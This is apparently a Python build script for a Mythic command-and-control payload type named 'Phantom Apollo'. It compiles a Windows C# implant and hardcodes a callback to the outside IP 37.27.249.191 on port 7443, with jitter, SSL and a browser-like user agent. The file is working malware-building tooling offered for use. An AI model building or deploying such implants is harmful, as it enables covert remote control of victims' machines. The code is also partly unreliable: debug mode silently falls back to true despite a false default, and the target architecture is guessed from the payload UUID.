import pathlib
from mythic_container import *
import os
import subprocess
import base64

class PhantomApollo(PayloadType):
    name = "phantom_apollo"
    file_extension = "exe"
    author = "@phantom"
    supported_os = [
        SupportedOS.Windows,
    ]
    wrapper = False
    wrapped_payloads = []
    note = "Phantom Apollo - Advanced C2 agent with Apollo compatibility and enhanced features"
    supports_dynamic_loading = True
    mythic_encrypts = False
    translation_container = None
    agent_type = "agent"
    agent_icon_path = pathlib.Path(".") / "phantom_apollo" / "agent_functions" / "mythic_agent_icon.svg"
    
    build_parameters = [
        BuildParameter(
            name="callback_host",
            parameter_type=BuildParameterType.String,
            description="Callback Host",
            default_value="37.27.249.191",
        ),
        BuildParameter(
            name="callback_port",
            parameter_type=BuildParameterType.Number,
            description="Callback Port",
            default_value="7443",
        ),
        BuildParameter(
            name="callback_interval",
            parameter_type=BuildParameterType.Number,
            description="Callback Interval in seconds",
            default_value="10",
        ),
        BuildParameter(
            name="callback_jitter",
            parameter_type=BuildParameterType.Number,
            description="Callback Jitter percentage (0-100)",
            default_value="10",
        ),
        BuildParameter(
            name="use_ssl",
            parameter_type=BuildParameterType.Boolean,
            description="Use SSL for callback",
            default_value=True,
        ),
        BuildParameter(
            name="user_agent",
            parameter_type=BuildParameterType.String,
            description="User Agent String",
            default_value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ),
        BuildParameter(
            name="aes_psk",
            parameter_type=BuildParameterType.String,
            description="Encryption Key",
            default_value="",
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug mode",
            default_value=False,
        ),
    ]
    
    c2_profiles = ["HTTP"]
    
    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        
        # Build parameters with your Mythic server
        callback_host = self.get_parameter("callback_host") or "37.27.249.191"
        callback_port = self.get_parameter("callback_port") or "7443"
        callback_interval = self.get_parameter("callback_interval") or "10"
        callback_jitter = self.get_parameter("callback_jitter") or "10"
        use_ssl = self.get_parameter("use_ssl") if self.get_parameter("use_ssl") is not None else True
        user_agent = self.get_parameter("user_agent") or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        aes_psk = self.get_parameter("aes_psk") or ""
        debug = self.get_parameter("debug") if self.get_parameter("debug") is not None else True
        
        # Construct callback URL for your Mythic server
        protocol = "https" if use_ssl else "http"
        callback_url = f"{protocol}://{callback_host}:{callback_port}"
        
        # Create Config.cs with build parameters
        config_template = f"""using System.Collections.Generic;
using PhantomInterop.Classes.Core;

namespace Phantom
{{
    public class Settings
    {{
        public static string AgentIdentifier = "{self.uuid}";
        
        public static Dictionary<string, C2ProfileInfo> CommProfiles = new Dictionary<string, C2ProfileInfo>()
        {{
            ["http"] = new C2ProfileInfo()
            {{
                Name = "http",
                Parameters = new Dictionary<string, object>()
                {{
                    ["callback_host"] = "{callback_host}",
                    ["callback_port"] = "{callback_port}",
                    ["callback_interval"] = {callback_interval},
                    ["callback_jitter"] = {callback_jitter},
                    ["encrypted_exchange_check"] = "{use_ssl}",
                    ["domain_front"] = "",
                    ["USER_AGENT"] = "{user_agent}",
                    ["headers"] = new Dictionary<string, string>()
                }},
                TCryptography = typeof(PSKCrypto.PSKCryptography),
                TSerializer = typeof(PhantomInterop.Serializers.JsonHandler),
                TC2Profile = typeof(HttpProfile.HttpProfile)
            }}
        }};
        
        public static string CryptoKey = "{aes_psk}";
        
        public static bool DebugMode = {str(debug).lower()};
    }}
}}"""
        
        with open("agent_code/Phantom/Settings.cs", "w") as f:
            f.write(config_template)
        
        try:
            # Determine target architecture
            target_arch = "x64" if "x64" in self.uuid or "amd64" in self.uuid else "x86"
            
            # Build the C# project using MSBuild/dotnet
            build_cmd = [
                "dotnet", "build", 
                "agent_code/Phantom.sln",
                "-c", "Release",
                "-p:Platform=x64" if target_arch == "x64" else "-p:Platform=x86",
                "-o", "build_output"
            ]
            
            # Execute build command
            result = subprocess.run(build_cmd, capture_output=True, text=True, cwd=".")
            
            if result.returncode != 0:
                # Try with msbuild if dotnet fails
                build_cmd = [
                    "msbuild", 
                    "agent_code/Phantom.sln",
                    "/p:Configuration=Release",
                    f"/p:Platform={target_arch}",
                    "/p:OutputPath=../build_output/"
                ]
                
                result = subprocess.run(build_cmd, capture_output=True, text=True, cwd=".")
                
                if result.returncode != 0:
                    resp.build_stderr = f"Build failed: {result.stderr}"
                    resp.status = BuildStatus.Error
                    return resp
            
            # Find the built executable
            exe_path = None
            for file in os.listdir("build_output"):
                if file.endswith(".exe") and "Phantom" in file:
                    exe_path = os.path.join("build_output", file)
                    break
            
            if not exe_path or not os.path.exists(exe_path):
                resp.build_stderr = "Could not find built executable"
                resp.status = BuildStatus.Error
                return resp
            
            # Read the compiled executable
            with open(exe_path, "rb") as f:
                resp.payload = base64.b64encode(f.read()).decode()
            
            resp.build_message = f"Successfully built Phantom Apollo for Windows {target_arch}"
            
            # Clean up build artifacts
            import shutil
            if os.path.exists("build_output"):
                shutil.rmtree("build_output")
            if os.path.exists("agent_code/Phantom/Settings.cs"):
                os.remove("agent_code/Phantom/Settings.cs")
            
        except Exception as e:
            resp.build_stderr = f"Build error: {str(e)}"
            resp.status = BuildStatus.Error
        
        return resp